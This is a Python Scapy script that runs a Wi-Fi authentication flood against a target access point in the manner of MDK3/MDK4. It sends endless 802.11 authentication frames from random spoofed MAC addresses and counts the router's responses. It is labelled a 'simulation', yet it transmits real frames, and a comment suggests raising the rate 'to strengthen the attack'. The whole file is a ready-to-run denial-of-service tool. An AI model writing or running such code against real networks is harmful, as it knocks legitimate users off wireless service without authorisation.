from scapy.all import *
import threading
import time
import os
import sys

# ========          User Setup             ========
iface = input("Interface (e.g., wlan0mon): ")
target_mac = input("Target MAC (e.g., XX:XX:XX:XX:XX:XX): ")
channel = int(input("Channel (e.g., 4): "))

# ========    Verify root permissions      ========
if os.geteuid() != 0:
    print("[ERROR] The program must be run with privileges root!")
    sys.exit(1)

# ========      State variables            ========
packets_sent = 0
packets_received = 0
stop_threads = False

# ========      channel tuning                         ========
os.system(f"iwconfig {iface} channel {channel}")

# ======== High-speed packet transmission function for MDK3/MDK4 simulation  ========
def send_flood_packets():
    global packets_sent
    while not stop_threads:
        try:
           
            for _ in range(20):  # The number can be increased to strengthen the attack
                pkt = RadioTap()/Dot11(addr1=target_mac, addr2=RandMAC(), addr3=target_mac)/Dot11Auth()
                sendp(pkt, iface=iface, verbose=0)
                packets_sent += 10
            time.sleep(0.01)  # Reduce delay for simulation flood
        except Exception as e:
            print(f"\n[ERROR] Error sending package: {e}")

# ======== Packet sniffing function   ========
def sniff_response(pkt):
    global packets_received
    if pkt.haslayer(Dot11Auth) and pkt.addr2 == target_mac:
        packets_received += 1
        print(f"\n[SUCCESS] The router responded! Packets Received: {packets_received}")

# ======== Display statistics function ========
def display_stats():
    while not stop_threads:
        print(f"\rPackets Sent: {packets_sent} | Packets Received: {packets_received}", end="")
        time.sleep(1)

# ========   Main program             ========
print(f"Start simulation on {target_mac} On channele {channel}...\npress Ctrl+C To stop the simulation.\n")

try:
    sender_thread = threading.Thread(target=send_flood_packets)
    sender_thread.start()

    sniff_thread = threading.Thread(target=lambda: sniff(iface=iface, prn=sniff_response, stop_filter=lambda x: stop_threads))
    sniff_thread.start()

    stats_thread = threading.Thread(target=display_stats)
    stats_thread.start()

    sender_thread.join()
    sniff_thread.join()
    stats_thread.join()

except KeyboardInterrupt:
    print("\n[INFO] The simulation was stopped manually..")
    stop_threads = True
    sender_thread.join()
    sniff_thread.join()
    stats_thread.join()
finally:
    print(f"\nSent packages: {packets_sent} | Received packages: {packets_received}")
